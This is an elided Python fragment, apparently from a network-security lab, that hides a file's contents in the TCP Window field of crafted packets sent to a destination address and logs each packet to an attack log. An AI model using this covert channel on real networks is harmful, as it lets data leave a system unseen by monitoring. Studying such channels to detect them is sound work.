...
# -------------------------
# Convert 2 characters -> 16-bit TCP Window value
# -------------------------
def chars_to_window(chars):
...
# -------------------------
# Load file -> return list of (block, window_num)
# -------------------------
...
# -------------------------
# Send packets carrying covert data inside TCP Window field
# -------------------------
def send_window_chunks(chunks, src_ip, dst_ip, dport=80, inter=0.02):
    packets = []
    ...
    for index, (block, window_num) in enumerate(chunks):
        pkt = IP(src=src_ip, dst=dst_ip, id=index) / TCP(
            sport=44444,
            dport=dport,
            seq=seq_base + index,  # keep seq as baseline
            window=window_num,  # covert data in Window field
            flags="A",
            ack=0
        )
        ...
        print(f"Sent block '{block}' as Window={window_num}")

        # Log the attack in the attack_log.json array
        bits = ''.join(f'{ord(c):08b}' for c in block)
        entry = {
            "packet_id": next_attack_id,
            "modified_field": "Window",
            "original_value": 8192,  # standard TCP window size
            "modified_value": window_num,
            "covert_bits": bits,
...
if __name__ == "__main__":
    ...
    send_window_chunks(chunks, src_ip, dst_ip, dport)
